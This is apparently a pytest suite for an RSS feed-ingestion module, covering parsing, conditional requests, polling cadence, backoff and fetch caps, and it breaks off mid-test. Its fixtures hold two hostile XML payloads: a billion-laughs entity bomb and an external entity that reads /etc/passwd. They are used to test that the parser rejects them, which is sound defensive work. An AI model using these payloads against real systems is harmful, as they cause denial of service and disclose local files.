"""Tests for the RSS evidence locker.

No live network anywhere: urllib.request.urlopen is mocked and every feed body
is an inline RSS 2.0 or RDF/RSS 1.0 fixture. The database is either the
in-memory SQLite test engine or a mock session.

The defensive paths get first-class coverage, not just a happy-path assertion,
because they are the paths dev actually runs: merkle_log_entries and
pipeline_runs are both unmigrated there, so a missing-table error has to leave
the run going rather than sink it. Two of those tests deliberately use a real
session whose schema genuinely lacks the table rather than mocking the error,
because the savepoint that keeps the transaction alive is the interesting part.

pytest-asyncio runs in auto mode, so the async tests below are awaited by the
session's own event loop and the db_session fixture shares it.
"""

import inspect
import json
from datetime import datetime, timedelta, timezone
from unittest.mock import MagicMock, patch
from uuid import uuid4

import pytest
import sqlalchemy.ext.asyncio as sa_asyncio
from sqlalchemy import func, select, text
from sqlalchemy.exc import IntegrityError, ProgrammingError
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.pool import StaticPool

from src.ingestion import rss_evidence
from src.ingestion.adapters.rss_evidence_adapter import RssEvidenceAdapter
from src.ingestion.run import parse_args
from src.schema.models import Base, EdgePredicate, EntityEdge, PipelineRun, RawArticle, SourceTier
from src.transparency.log import InMemoryMerkleLog, verify_chain
from src.utils.trafilatura_extract import compute_url_hash


# ------------------------------------------------------------------ fixtures

RSS20_BYTES = b"""<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>BBC World</title>
    <link>https://www.bbc.co.uk/news/world</link>
    <item>
      <title>Ceasefire holds as talks resume in the border region</title>
      <link>https://www.bbc.co.uk/news/world-12345678</link>
      <pubDate>Tue, 30 Sep 2026 14:05:00 GMT</pubDate>
      <description>&lt;p&gt;Negotiators &amp; observers met.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Second item without any date</title>
      <link>https://www.bbc.co.uk/news/world-87654321</link>
      <description>Plain summary text.</description>
    </item>
    <item>
      <title>Third item dated by Dublin Core</title>
      <link>https://www.bbc.co.uk/news/world-11223344</link>
      <dc:date>2026-09-29T08:30:00+00:00</dc:date>
      <description>Third summary.</description>
    </item>
  </channel>
</rss>
"""

RDF_BYTES = b"""<?xml version="1.0" encoding="UTF-8"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns="http://purl.org/rss/1.0/"
         xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel rdf:about="https://rss.dw.com/">
    <title>DW</title>
    <link>https://rss.dw.com/</link>
  </channel>
  <item rdf:about="https://rss.dw.com/rdf/rss-en-all/dw-1">
    <title>Berlin coalition talks collapse</title>
    <link>https://rss.dw.com/dw-1</link>
    <dc:date>2026-09-28T11:00:00Z</dc:date>
    <description>CDF summary text for the RDF item.</description>
  </item>
  <item rdf:about="https://rss.dw.com/rdf/rss-en-all/dw-2">
    <title>Second RDF item</title>
    <link>https://rss.dw.com/dw-2</link>
    <dc:date>2026-09-27T11:00:00Z</dc:date>
    <description>Another RDF summary.</description>
  </item>
</rdf:RDF>
"""

# A billion-laughs bomb: internal entities expanding into more internal
# entities. Correct handling is refusal -- no expansion, no memory growth.
XXE_BOMB = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<rss version="2.0">
  <channel>
    <title>&lol9;</title>
    <item>
      <title>&lol9;</title>
      <link>https://example.invalid/x</link>
    </item>
  </channel>
</rss>
"""

# An external entity pointing at a local file. Nothing may be read off disk.
XXE_EXTERNAL = b"""<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <item>
      <title>&xxe;</title>
      <link>https://example.invalid/y</link>
    </item>
  </channel>
</rss>
"""

LONG_BODY = "A full article body. " * 40  # comfortably over MIN_BODY_CHARS
FIXED_NOW = datetime(2026, 10, 1, 12, 0, tzinfo=timezone.utc)

FEED_A = {
    "key": "bbc_world",
    "name": "BBC",
    "domain": "bbc.co.uk",
    "url": "https://feeds.bbci.co.uk/news/world/rss.xml",
    "tier": SourceTier.TIER1,
}
FEED_B = {
    "key": "npr_news",
    "name": "NPR",
    "domain": "npr.org",
    "url": "https://feeds.npr.org/1001/rss.xml",
    "tier": SourceTier.TIER1,
}


def _fake_response(status=200, body=b"", headers=None):
    """A urlopen context manager standing in for an HTTP response."""
    resp = MagicMock()
    resp.status = status
    resp.read = MagicMock(return_value=body)
    resp.headers = headers or {}
    resp.__enter__ = lambda self: self
    resp.__exit__ = lambda self, *exc: False
    return resp


def _http_error(code, headers=None):
    """An HTTPError, which urllib raises for every non-2xx including 304."""
    from urllib.error import HTTPError

    return HTTPError("https://example.invalid/feed", code, "mock", headers or {}, None)


async def _extract_ok(url, html=None, source_key=None):
    return (f"Body for {url}. " * 30, f"Extracted title for {url}")


async def _extract_short(url, html=None, source_key=None):
    return ("Too short.", None)


async def _extract_none(url, html=None, source_key=None):
    return (None, None)


def _rss_with_links(*links, prefix="https://www.bbc.co.uk/news/world-"):
    items = "".join(
        f"<item><title>Item {link}</title><link>{prefix}{link}</link>"
        f"<description>Summary {link}</description></item>"
        for link in links
    )
    return (
        '<?xml version="1.0"?><rss version="2.0"><channel>'
        f"<title>Feed</title>{items}</channel></rss>"
    ).encode("utf-8")


def _persisted_article(idx=0, domain="bbc.co.uk", url=None):
    """A RawArticle that already has an id, standing in for a flushed row."""
    article = RawArticle(
        url=url or f"https://www.bbc.co.uk/news/world-{idx}",
        url_hash=f"{idx:064d}",
        title=f"Title {idx}",
        body_text=LONG_BODY,
        source_domain=domain,
        source_tier=SourceTier.TIER1,
        content_hash=f"{idx + 100:064d}",
    )
    # RawArticle's id default is Python-side, so it has not run yet; set one
    # explicitly to stand in for a row the session has already flushed.
    article.id = uuid4()
    return article


async def _engine_with(tables):
    """An in-memory SQLite engine with exactly the given tables created."""
    engine = sa_asyncio.create_async_engine(
        "sqlite+aiosqlite:///:memory:",
        poolclass=StaticPool,
        connect_args={"check_same_thread": False},
    )
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all, tables=tables)
    return engine


class _MemoryLog:
    """In-memory Merkle log standing in for SqlAlchemyMerkleLog."""

    def __init__(self):
        self._inner = InMemoryMerkleLog()

    async def append(self, payload):
        return await self._inner.append(payload)


# ------------------------------------------------------------- FeedState JSON


def test_feed_state_json_round_trip(tmp_path):
    """A state file written and read back preserves every field exactly."""
    path = tmp_path / "nested" / "rss_evidence_state.json"
    states = {
        "bbc_world": rss_evidence.FeedState(),
        "guardian_world": rss_evidence.FeedState(
            etag='W/"abc123"',
            last_modified="Wed, 30 Sep 2026 14:05:00 GMT",
            last_poll_ts=1759248000.0,
            last_yield_ts=1759247900.0,
            consecutive_304s=2,
            backoff_until_ts=1759250000.0,
            consecutive_failures=3,
        ),
    }
    written = rss_evidence.save_feed_state(states, path)
    assert written == path
    assert path.exists(), "save_feed_state must create the parent directory"

    loaded = rss_evidence.load_feed_state(path)
    assert set(loaded) == {"bbc_world", "guardian_world"}
    assert loaded["guardian_world"] == states["guardian_world"]
    assert loaded["bbc_world"] == rss_evidence.FeedState()


def test_load_feed_state_missing_and_corrupt(tmp_path):
    """A missing or corrupt state file yields empty state rather than raising."""
    assert rss_evidence.load_feed_state(tmp_path / "absent.json") == {}

    corrupt = tmp_path / "corrupt.json"
    corrupt.write_text("{not json", encoding="utf-8")
    assert rss_evidence.load_feed_state(corrupt) == {}

    wrong_shape = tmp_path / "wrong.json"
    wrong_shape.write_text(json.dumps(["a", "b"]), encoding="utf-8")
    assert rss_evidence.load_feed_state(wrong_shape) == {}

    # A partially written file still yields whatever fields it does carry.
    partial = tmp_path / "partial.json"
    partial.write_text(json.dumps({"feeds": {"bbc_world": {"etag": 'W/"x"', "junk": 1}}}), encoding="utf-8")
    assert rss_evidence.load_feed_state(partial) == {
        "bbc_world": rss_evidence.FeedState(etag='W/"x"')
    }


def test_state_path_env_override(tmp_path, monkeypatch):
    """RSS_EVIDENCE_STATE_PATH wins; otherwise it is var/ under the repo root."""
    monkeypatch.setenv("RSS_EVIDENCE_STATE_PATH", str(tmp_path / "custom.json"))
    assert rss_evidence.state_path() == tmp_path / "custom.json"

    monkeypatch.delenv("RSS_EVIDENCE_STATE_PATH")
    default = rss_evidence.state_path()
    assert default.name == "rss_evidence_state.json"
    assert default.parent.name == "var"
    # parents[2] of src/ingestion/rss_evidence.py is the repo root, so the state
    # file does not move when the process cwd does.
    repo_root = rss_evidence.Path(rss_evidence.__file__).resolve().parents[2]
    assert default == repo_root / "var" / "rss_evidence_state.json"
    assert default == rss_evidence.DEFAULT_STATE_PATH


# ------------------------------------------------------------------- parsing


def test_parse_feed_xml_rss20():
    """RSS 2.0: title, link, pubDate or dc:date, and a stripped description."""
    items = rss_evidence.parse_feed_xml(RSS20_BYTES)
    assert len(items) == 3

    first = items[0]
    assert first["title"] == "Ceasefire holds as talks resume in the border region"
    assert first["link"] == "https://www.bbc.co.uk/news/world-12345678"
    assert first["published_raw"] == "Tue, 30 Sep 2026 14:05:00 GMT"
    assert first["summary"] == "Negotiators & observers met."

    # An item with no date parses rather than being dropped.
    assert items[1]["published_raw"] == ""
    assert items[1]["summary"] == "Plain summary text."

    # dc:date is found by local name even though it is a different namespace.
    assert items[2]["published_raw"] == "2026-09-29T08:30:00+00:00"


def test_parse_feed_xml_rdf():
    """RDF/RSS 1.0: items sit beside <channel>, not inside it."""
    items = rss_evidence.parse_feed_xml(RDF_BYTES)
    assert len(items) == 2
    assert items[0]["title"] == "Berlin coalition talks collapse"
    assert items[0]["link"] == "https://rss.dw.com/dw-1"
    assert items[0]["published_raw"] == "2026-09-28T11:00:00Z"
    assert items[0]["summary"] == "CDF summary text for the RDF item."


def test_parse_feed_xml_rdf_falls_back_to_rdf_about():
    """An RDF item with no <link> still yields a URL from rdf:about."""
    body = b"""<?xml version="1.0"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns="http://purl.org/rss/1.0/">
  <item rdf:about="https://example.invalid/only-about">
    <title>No link element</title>
  </item>
</rdf:RDF>
"""
    assert rss_evidence.parse_feed_xml(body) == [
        {
            "title": "No link element",
            "link": "https://example.invalid/only-about",
            "published_raw": "",
            "summary": "",
        }
    ]


def test_parse_feed_xml_prefers_encoded_over_description():
    """content:encoded wins when a feed carries both, and is stripped."""
    body = b"""<?xml version="1.0"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel><item>
    <title>Both bodies</title>
    <link>https://example.invalid/both</link>
    <content:encoded>&lt;p&gt;Full body text.&lt;/p&gt;</content:encoded>
    <description>Teaser only.</description>
  </item></channel></rss>
"""
    items = rss_evidence.parse_feed_xml(body)
    assert len(items) == 1
    assert "Full body text." in items[0]["summary"]


def test_parse_feed_xml_xxe_bomb_rejected():
    """A billion-laughs payload is refused: no expansion, no items, no hang."""
    items = rss_evidence.parse_feed_xml(XXE_BOMB)
    assert items == []
    assert not any("lol" in (item["title"] or "") for item in items)


def test_parse_feed_xml_xxe_external_entity_rejected():
    """An external file:// entity is refused: nothing is read off disk."""
    assert rss_evidence.parse_feed_xml(XXE_EXTERNAL) == []


def test_parse_feed_xml_rejects_empty_and_malformed():
    """Empty, whitespace-only and non-XML bodies all yield no items."""
    assert rss_evidence.parse_feed_xml(b"") == []
    assert rss_evidence.parse_feed_xml(b"   ") == []
    assert rss_evidence.parse_feed_xml(b"not xml at all") == []
    assert rss_evidence.parse_feed_xml(RSS20_BYTES[:120]) == []


def test_parse_feed_xml_accepts_str_and_skips_linkless_items():
    """A str body works, and an item with no resolvable URL is skipped."""
    assert len(rss_evidence.parse_feed_xml(RSS20_BYTES.decode("utf-8"))) == 3

    body = b"""<?xml version="1.0"?>
    <rss version="2.0"><channel>
      <item><title>No link</title></item>
      <item><title>Has link</title><link>https://example.invalid/ok</link></item>
    </channel></rss>
    """
    assert [item["link"] for item in rss_evidence.parse_feed_xml(body)] == [
        "https://example.invalid/ok"
    ]


def test_parse_published_formats():
    """RFC 822, ISO with offset, ISO Z, naive ISO, and garbage."""
    assert rss_evidence.parse_published("Tue, 30 Sep 2026 14:05:00 GMT") == datetime(
        2026, 9, 30, 14, 5, tzinfo=timezone.utc
    )
    assert rss_evidence.parse_published("2026-09-29T08:30:00+00:00") == datetime(
        2026, 9, 29, 8, 30, tzinfo=timezone.utc
    )
    assert rss_evidence.parse_published("2026-09-29T08:30:00Z") == datetime(
        2026, 9, 29, 8, 30, tzinfo=timezone.utc
    )
    assert rss_evidence.parse_published("2026-09-29T08:30:00") == datetime(
        2026, 9, 29, 8, 30, tzinfo=timezone.utc
    )
    # A non-UTC offset is normalized rather than dropped.
    assert rss_evidence.parse_published("2026-09-29T10:30:00+02:00") == datetime(
        2026, 9, 29, 8, 30, tzinfo=timezone.utc
    )
    assert rss_evidence.parse_published("not a date") is None
    assert rss_evidence.parse_published("") is None
    assert rss_evidence.parse_published(None) is None


# -------------------------------------------------------- conditional requests


def test_build_request_headers_baseline():
    """With no validators held, only the honest User-Agent and Accept go out."""
    expected = {
        "User-Agent": "news-pipeline-evidence/1.0",
        "Accept": "application/rss+xml, application/xml, text/xml",
    }
    assert rss_evidence.build_request_headers(None) == expected
    assert rss_evidence.build_request_headers(rss_evidence.FeedState()) == expected


def test_build_request_headers_from_state():
    """Validators we hold are replayed as If-None-Match / If-Modified-Since."""
    state = rss_evidence.FeedState(
        etag='W/"abc123"', last_modified="Wed, 30 Sep 2026 14:05:00 GMT"
    )
    headers = rss_evidence.build_request_headers(state)
    assert headers["If-None-Match"] == 'W/"abc123"'
    assert headers["If-Modified-Since"] == "Wed, 30 Sep 2026 14:05:00 GMT"
    assert headers["User-Agent"] == "news-pipeline-evidence/1.0"

    # Only the ETag: the other feed's validator set is still honoured.
    etag_only = rss_evidence.build_request_headers(rss_evidence.FeedState(etag='W/"only"'))
    assert etag_only["If-None-Match"] == 'W/"only"'
    assert "If-Modified-Since" not in etag_only


def test_fetch_feed_polite_sends_conditional_headers():
    """The conditional headers reach the actual Request object."""
    state = rss_evidence.FeedState(
        etag='W/"abc123"', last_modified="Wed, 30 Sep 2026 14:05:00 GMT"
    )
    captured = {}

    def fake_urlopen(request, timeout=None):
        captured["headers"] = dict(request.headers)
        captured["timeout"] = timeout
        return _fake_response(200, RSS20_BYTES, {"ETag": 'W/"new"', "Last-Modified": "x"})

    with patch.object(rss_evidence, "urlopen", side_effect=fake_urlopen):
        status, body, etag, last_modified, retry_after = rss_evidence.fetch_feed_polite(
            "https://example.invalid/feed", state
        )

    assert status == 200
    assert body == RSS20_BYTES
    assert etag == 'W/"new"'
    assert last_modified == "x"
    assert retry_after is None
    assert captured["timeout"] == rss_evidence.HTTP_TIMEOUT_SECONDS == 20
    # urllib title-cases header keys; match case-insensitively.
    lowered = {k.lower(): v for k, v in captured["headers"].items()}
    assert lowered["if-none-match"] == 'W/"abc123"'
    assert lowered["if-modified-since"] == "Wed, 30 Sep 2026 14:05:00 GMT"
    assert lowered["user-agent"] == "news-pipeline-evidence/1.0"


def test_fetch_feed_polite_transport_failure_returns_zero():
    """A transport failure is status 0, not an exception."""
    from urllib.error import URLError

    with patch.object(rss_evidence, "urlopen", side_effect=URLError("proxy said no")):
        assert rss_evidence.fetch_feed_polite("https://example.invalid/feed") == (
            0,
            b"",
            None,
            None,
            None,
        )


def test_fetch_feed_polite_reads_retry_after():
    """Retry-After delta-seconds is parsed; an HTTP-date is ignored."""
    with patch.object(
        rss_evidence, "urlopen", side_effect=_http_error(429, {"Retry-After": "120"})
    ):
        status, body, _, _, retry_after = rss_evidence.fetch_feed_polite("https://x.invalid/f")
    assert (status, body, retry_after) == (429, b"", 120)

    with patch.object(
        rss_evidence,
        "urlopen",
        side_effect=_http_error(503, {"Retry-After": "Wed, 30 Sep 2026 14:05:00 GMT"}),
    ):
        status, _, _, _, retry_after = rss_evidence.fetch_feed_polite("https://x.invalid/f")
    assert (status, retry_after) == (503, None)

    with patch.object(rss_evidence, "urlopen", side_effect=_http_error(429, {"Retry-After": "junk"})):
        _, _, _, _, retry_after = rss_evidence.fetch_feed_polite("https://x.invalid/f")
    assert retry_after is None


# ------------------------------------------------------------------ cadence


def _at(offset, base=1_700_000_000.0):
    return base + offset


def test_should_poll_never_polled():
    """A feed with no last_poll_ts is due immediately."""
    assert rss_evidence.should_poll(rss_evidence.FeedState(), _at(0)) is True


def test_should_poll_base_interval():
    """With no yield and no 304 run, the interval is 900s."""
    state = rss_evidence.FeedState(last_poll_ts=_at(0))
    assert rss_evidence.POLL_INTERVAL_BASE_SECONDS == 900
    assert rss_evidence.should_poll(state, _at(899)) is False
    assert rss_evidence.should_poll(state, _at(900)) is True


def test_should_poll_shortened_after_yield():
    """A poll that yielded items shortens the interval to 600s."""
    state = rss_evidence.FeedState(last_poll_ts=_at(0), last_yield_ts=_at(0))
    assert rss_evidence.POLL_INTERVAL_YIELD_SECONDS == 600
    assert rss_evidence.should_poll(state, _at(599)) is False
    assert rss_evidence.should_poll(state, _at(600)) is True


def test_should_poll_idle_after_three_304s():
    """Three consecutive 304s move the feed to the 3600s idle interval."""
    assert rss_evidence.CONSECUTIVE_304S_FOR_IDLE == 3
    state = rss_evidence.FeedState(last_poll_ts=_at(0), last_yield_ts=_at(0), consecutive_304s=2)
    assert rss_evidence.should_poll(state, _at(600)) is True, "two 304s still yields cadence"

    state.consecutive_304s = 3
    assert rss_evidence.POLL_INTERVAL_IDLE_SECONDS == 3600
    assert rss_evidence.should_poll(state, _at(600)) is False
    assert rss_evidence.should_poll(state, _at(3599)) is False
    assert rss_evidence.should_poll(state, _at(3600)) is True


def test_should_poll_backoff_gate_is_absolute():
    """A feed inside its backoff window is skipped regardless of cadence."""
    state = rss_evidence.FeedState(last_poll_ts=_at(0), backoff_until_ts=_at(1000))
    assert rss_evidence.should_poll(state, _at(999)) is False
    assert rss_evidence.should_poll(state, _at(1000)) is True

    idle = rss_evidence.FeedState(last_poll_ts=_at(0), consecutive_304s=9, backoff_until_ts=_at(5000))
    assert rss_evidence.should_poll(idle, _at(4999)) is False


def test_should_poll_is_pure():
    """should_poll does not mutate the state it inspects."""
    state = rss_evidence.FeedState(last_poll_ts=_at(0), consecutive_304s=1)
    before = state.to_dict()
    rss_evidence.should_poll(state, _at(10_000))
    assert state.to_dict() == before


def test_backoff_seconds_never_exceeds_ceiling():
    """Exponential backoff doubles from 60s and is capped at 3600s."""
    assert rss_evidence.BACKOFF_BASE_SECONDS == 60
    assert rss_evidence.BACKOFF_MAX_SECONDS == 3600
    assert rss_evidence.backoff_seconds(0) == 0
    assert rss_evidence.backoff_seconds(1) == 60
    assert rss_evidence.backoff_seconds(2) == 120
    assert rss_evidence.backoff_seconds(3) == 240
    assert rss_evidence.backoff_seconds(7) == 3600
    for failures in range(1, 500):
        assert rss_evidence.backoff_seconds(failures) <= 3600


# ------------------------------------------------------------------- refresh


async def test_refresh_304_yields_nothing_and_increments_counter():
    """A 304 is a no-change poll: state advances, no items, backoff cleared."""
    states = {FEED_A["key"]: rss_evidence.FeedState(etag='W/"old"')}

    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(304, b"", None, None, None)
    ):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )

    assert report.feeds_polled == ["bbc_world"]
    assert report.items_seen == 0
    assert report.items == []
    assert report.body_fetches == 0
    assert report.feeds_failed == []
    assert states["bbc_world"].consecutive_304s == 1
    assert states["bbc_world"].last_poll_ts == FIXED_NOW.timestamp()
    # The ETag we hold is still good, so it stands.
    assert states["bbc_world"].etag == 'W/"old"'


async def test_refresh_304_run_builds_to_idle_cadence():
    """Three 304s in a row put the feed on the hour cadence.

    Each poll is 3600s after the last one, which the yielding cadence would also
    allow, so the only thing that changes between polls is the 304 counter.
    """
    states = {"bbc_world": rss_evidence.FeedState()}
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(304, b"", None, None, None)
    ):
        clock = FIXED_NOW
        for expected in (1, 2, 3):
            await rss_evidence.refresh(
                states, [FEED_A], now_fn=lambda tz, clock=clock: clock, extract=_extract_ok
            )
            assert states["bbc_world"].consecutive_304s == expected
            clock = clock + timedelta(seconds=rss_evidence.POLL_INTERVAL_IDLE_SECONDS)

    last_poll = states["bbc_world"].last_poll_ts
    assert states["bbc_world"].consecutive_304s == 3
    assert rss_evidence.should_poll(states["bbc_world"], last_poll + 600) is False
    assert rss_evidence.should_poll(states["bbc_world"], last_poll + 3599) is False
    assert rss_evidence.should_poll(states["bbc_world"], last_poll + 3600) is True


async def test_refresh_200_stores_validators_and_resets_304_run():
    """A 200 records the validators the server sent and clears the 304 run."""
    states = {"bbc_world": rss_evidence.FeedState(etag='W/"old"', consecutive_304s=4)}

    with patch.object(
        rss_evidence,
        "fetch_feed_polite",
        return_value=(200, RSS20_BYTES, 'W/"new"', "Wed, 30 Sep 2026 14:05:00 GMT", None),
    ):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )

    state = states["bbc_world"]
    assert state.etag == 'W/"new"'
    assert state.last_modified == "Wed, 30 Sep 2026 14:05:00 GMT"
    assert state.consecutive_304s == 0
    assert state.consecutive_failures == 0
    assert state.backoff_until_ts == 0.0
    assert state.last_yield_ts == FIXED_NOW.timestamp()
    assert report.items_seen == 3
    assert len(report.items) == 3
    assert report.items[0]["source_domain"] == "bbc.co.uk"
    assert report.items[0]["source_name"] == "BBC"
    assert report.items[0]["source_key"] == "bbc_world"
    assert report.items[0]["source_tier"] is SourceTier.TIER1
    assert report.items[0]["published_at"] == datetime(2026, 9, 30, 14, 5, tzinfo=timezone.utc)
    assert report.items[0]["body_sha256"]
    # The extracted title wins when it is available.
    assert report.items[0]["title"] == "Extracted title for https://www.bbc.co.uk/news/world-12345678"


async def test_refresh_200_without_validators_clears_them():
    """A feed that stops sending validators has its stored ones dropped."""
    states = {"bbc_world": rss_evidence.FeedState(etag='W/"stale"', last_modified="x")}
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(200, RSS20_BYTES, None, None, None)
    ):
        await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert states["bbc_world"].etag is None
    assert states["bbc_world"].last_modified is None


async def test_refresh_skips_feed_not_due():
    """A feed polled inside its base interval is not fetched at all."""
    states = {
        "bbc_world": rss_evidence.FeedState(
            last_poll_ts=FIXED_NOW.timestamp() - 60,
            last_yield_ts=FIXED_NOW.timestamp() - 60,
        )
    }
    with patch.object(rss_evidence, "fetch_feed_polite") as fetch:
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    fetch.assert_not_called()
    assert report.feeds_skipped == ["bbc_world"]
    assert report.feeds_polled == []


async def test_refresh_429_honors_retry_after():
    """429 uses Retry-After rather than the exponential schedule."""
    states = {"bbc_world": rss_evidence.FeedState()}
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(429, b"", None, None, 300)
    ):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert states["bbc_world"].backoff_until_ts == FIXED_NOW.timestamp() + 300
    assert states["bbc_world"].consecutive_failures == 1
    assert report.feeds_failed == ["bbc_world"]
    assert report.items == []


async def test_refresh_retry_after_is_capped():
    """An absurd Retry-After is clamped to the 3600s ceiling."""
    states = {"bbc_world": rss_evidence.FeedState()}
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(503, b"", None, None, 999_999)
    ):
        await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert states["bbc_world"].backoff_until_ts == FIXED_NOW.timestamp() + 3600


async def test_refresh_503_without_retry_after_uses_exponential_backoff():
    """503 with no Retry-After falls back to the doubling schedule."""
    states = {"bbc_world": rss_evidence.FeedState(consecutive_failures=2)}
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(503, b"", None, None, None)
    ):
        await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert states["bbc_world"].backoff_until_ts == FIXED_NOW.timestamp() + 240


async def test_refresh_4xx_marks_feed_failed_without_items():
    """A 403 is a broken feed, not a busy one: failed, backed off, no items."""
    states = {"bbc_world": rss_evidence.FeedState()}
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(403, b"", None, None, None)
    ):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert report.feeds_failed == ["bbc_world"]
    assert report.items == []
    assert report.body_fetches == 0
    assert states["bbc_world"].backoff_until_ts > FIXED_NOW.timestamp()


async def test_refresh_5xx_backs_off():
    """A 500 backs off exponentially: the fourth failure waits 480s."""
    states = {"bbc_world": rss_evidence.FeedState(consecutive_failures=3)}
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(500, b"", None, None, None)
    ):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert report.feeds_failed == ["bbc_world"]
    assert states["bbc_world"].consecutive_failures == 4
    assert states["bbc_world"].backoff_until_ts == FIXED_NOW.timestamp() + 480


async def test_refresh_transport_failure_backs_off():
    """status 0 (DNS/connect/proxy failure) backs off like a 5xx."""
    states = {"bbc_world": rss_evidence.FeedState()}
    with patch.object(rss_evidence, "fetch_feed_polite", return_value=(0, b"", None, None, None)):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert report.feeds_failed == ["bbc_world"]
    assert states["bbc_world"].backoff_until_ts == FIXED_NOW.timestamp() + 60


async def test_refresh_recovers_backoff_after_a_good_poll():
    """A successful poll clears the failure run and the backoff window."""
    states = {"bbc_world": rss_evidence.FeedState(consecutive_failures=5, backoff_until_ts=1e18)}
    # Force the feed due so the recovery is what is under test, not the gate.
    states["bbc_world"].backoff_until_ts = 0.0
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(200, RSS20_BYTES, None, None, None)
    ):
        await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert states["bbc_world"].consecutive_failures == 0
    assert states["bbc_world"].backoff_until_ts == 0.0


async def test_refresh_caps_body_fetches_per_cycle():
    """Ten article bodies across all feeds; the rest wait for a later cycle."""
    assert rss_evidence.MAX_BODY_FETCHES_PER_REFRESH == 10
    feed_a = dict(FEED_A, url="https://a.invalid/rss")
    feed_b = dict(FEED_B, url="https://b.invalid/rss")
    responses = [
        (200, _rss_with_links("a1", "a2", "a3", "a4", "a5", "a6"), None, None, None),
        (
            200,
            _rss_with_links("b1", "b2", "b3", "b4", "b5", "b6", prefix="https://b.invalid/"),
            None,
            None,
            None,
        ),
    ]
    fetched: list[str] = []

    async def tracking_extract(url, html=None, source_key=None):
        fetched.append(url)
        return (f"Body for {url}. " * 30, "Title")

    states = {}
    with patch.object(rss_evidence, "fetch_feed_polite", side_effect=responses):
        report = await rss_evidence.refresh(
            states, [feed_a, feed_b], now_fn=lambda tz: FIXED_NOW, extract=tracking_extract
        )

    assert len(fetched) == 10, "the cap is on body fetches, not feed fetches"
    assert report.body_fetches == 10
    assert report.items_seen == 12
    assert len(report.items) == 10
    assert report.feeds_polled == ["bbc_world", "npr_news"]
    # Only the feed that ran out of budget left entries behind: 6 of its own plus
    # the 4 it did fetch filled the budget, so its remaining 2 wait for later.
    assert report.feeds_deferred == ["npr_news"]
    assert report.skipped_by_cap == 2


async def test_refresh_defers_everything_past_the_cap():
    """With the budget already spent, later feeds are polled and deferred."""
    feed_a = dict(FEED_A, url="https://a.invalid/rss")
    feed_b = dict(FEED_B, url="https://b.invalid/rss")
    responses = [
        (200, _rss_with_links("a1", "a2"), None, None, None),
        (200, _rss_with_links("b1", prefix="https://b.invalid/"), None, None, None),
    ]
    states = {}
    with patch.object(rss_evidence, "fetch_feed_polite", side_effect=responses):
        report = await rss_evidence.refresh(
            states,
            [feed_a, feed_b],
            now_fn=lambda tz: FIXED_NOW,
            extract=_extract_ok,
            max_body_fetches=0,
        )
    assert report.body_fetches == 0
    assert report.items == []
    assert report.items_seen == 3, "items were still counted as seen"
    assert report.feeds_deferred == ["bbc_world", "npr_news"]


async def test_refresh_skips_short_and_missing_bodies():
    """A body under MIN_BODY_CHARS, or no body at all, is not evidence."""
    assert rss_evidence.MIN_BODY_CHARS == 200
    states = {}
